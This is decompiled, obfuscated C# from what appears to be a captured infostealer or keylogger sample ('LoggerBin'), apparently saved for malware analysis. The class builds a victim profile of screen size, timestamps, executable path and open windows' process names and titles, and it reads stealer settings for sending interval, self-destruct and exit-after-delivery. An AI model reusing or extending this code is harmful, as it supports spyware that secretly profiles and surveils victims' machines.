// Decompiled with JetBrains decompiler
// Type: YWc.vWg
// Assembly: service-nankasa.com-LoggerBin, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 762D1AAC-A39C-4AEB-81B7-3308162A414F
// Assembly location: C:\Users\darbinis\Desktop\Code analysis\Mallicious skriptai\Atack 09-17\RegAsm.exe

using System;
using System.Diagnostics;
using System.Drawing;
using System.Runtime.InteropServices;
using System.Text;
using System.Windows.Forms;
using VW1;

namespace YWc
{
  internal static class vWg
  {
    private static StringBuilder Log;
    private static readonly DateTime Started;
    private static vWg vlg;

    public static void sCo()
    {
      vWg.clR((object) vWg.Log);
      vWg.Log = new StringBuilder();
      vWg.Log.AppendLine(w4.bx(11696, w4.vY) + kdq.bx(kdq.gIk));
      vWg.Log.AppendLine((string) vWg.pl3((object) w4.bx(11722, w4.vY), (object) kdq.bx(kdq.VIK)));
      vWg.Log.AppendLine(w4.bx(11734, w4.vY) + kdq.bx(kdq.eIO));
      int num1 = 0;
      if (vWg.Ulo())
        goto label_10;
label_1:
      while (true)
      {
        switch (num1)
        {
          case 1:
            goto label_6;
          case 2:
            vWg.Log.AppendLine(w4.bx(11784, w4.vY) + kdq.bx(kdq.vIT));
            vWg.Log.AppendLine(w4.bx(11828, w4.vY) + kdq.bx(kdq.SIp));
            vWg.MlZ((object) vWg.Log, (object) (w4.bx(11842, w4.vY) + kdq.bx(kdq.dIC)));
            vWg.Log.AppendLine(w4.bx(11856, w4.vY) + kdq.bx(kdq.tIj));
            StringBuilder log = vWg.Log;
            string str1 = w4.bx(11868, w4.vY);
            Rectangle bounds = Screen.PrimaryScreen.Bounds;
            string str2 = bounds.Width.ToString();
            string str3 = w4.bx(11910, w4.vY);
            bounds = Screen.PrimaryScreen.Bounds;
            string str4 = bounds.Height.ToString();
            string str5 = str1 + str2 + str3 + str4;
            log.AppendLine(str5);
            vWg.Log.AppendLine((string) vWg.pl3((object) w4.bx(11916, w4.vY), (object) DateTime.Now.ToString()));
            vWg.Log.AppendLine((string) vWg.pl3((object) w4.bx(11948, w4.vY), (object) vWg.Started.ToString()));
            vWg.MlZ((object) vWg.Log, (object) string.Format(w4.bx(11970, w4.vY), (object) Convert.ToInt32(TimeSpan.FromHours((double) Convert.ToInt32(XWr.SendingInterval)).TotalHours)));
            vWg.Log.AppendLine(w4.bx(12010, w4.vY) + Application.ExecutablePath);
            vWg.Log.AppendLine(w4.bx(12032, w4.vY) + XWr.SelfDestruct);
            vWg.Log.AppendLine(w4.bx(12048, w4.vY) + XWr.ExitAfterDelivery);
            int num2;
            num1 = vWg.Wlm() == null ? 1 : num2;
            continue;
          default:
            vWg.MlZ((object) vWg.Log, (object) (w4.bx(11756, w4.vY) + kdq.bx(kdq.QIZ)));
            num1 = 2;
            continue;
        }
      }
label_6:
      vWg.Log.AppendLine(string.Format(w4.bx(12094, w4.vY), (object) NdD.bx(NdD.OdW)));
      vWg.Log.AppendLine(w4.bx(12140, w4.vY));
      foreach (Process process in Process.GetProcesses())
      {
        if (!string.IsNullOrWhiteSpace(process.MainWindowTitle))
          vWg.Log.AppendLine(w4.bx(12164, w4.vY) + process.ProcessName + w4.bx(12178, w4.vY) + (string) vWg.Wlx((object) process));
      }
      return;
label_10:
      num1 = 0;
      goto label_1;
    }

    public static string XCe() => vWg.Log.ToString();

    static vWg()
    {
      yd.bx(yd.EI);
      vWg.Log = new StringBuilder();
      vWg.Started = DateTime.Now;
    }

    internal static object clR([In] object obj0) => (object) ((StringBuilder) obj0).Clear();

    internal static object pl3([In] object obj0, [In] object obj1) => (object) ((string) obj0 + (string) obj1);

    internal static object MlZ([In] object obj0, [In] object obj1) => (object) ((StringBuilder) obj0).AppendLine((string) obj1);

    internal static object Wlx([In] object obj0) => (object) ((Process) obj0).MainWindowTitle;

    internal static bool Ulo() => vWg.vlg == null;

    internal static vWg Wlm() => vWg.vlg;
  }
}
